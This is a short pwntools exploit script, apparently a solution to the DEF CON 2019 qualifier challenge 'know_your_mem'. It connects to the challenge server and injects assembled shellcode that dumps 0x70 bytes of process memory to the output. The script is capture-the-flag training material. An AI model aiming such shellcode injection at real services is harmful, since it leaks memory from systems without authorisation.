#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
host , port = 'know_your_mem.quals2019.oooverflow.io' , 4669
y = remote( host , port )
#y = process( './know_your_mem' )

p = asm( 'mov rsi, [rsp - 8]' + shellcraft.write( 1 , 'rsi' , 0x70 ) )

y.sendafter( 'shellcode.' , p16( len(p) ) + p )

y.interactive()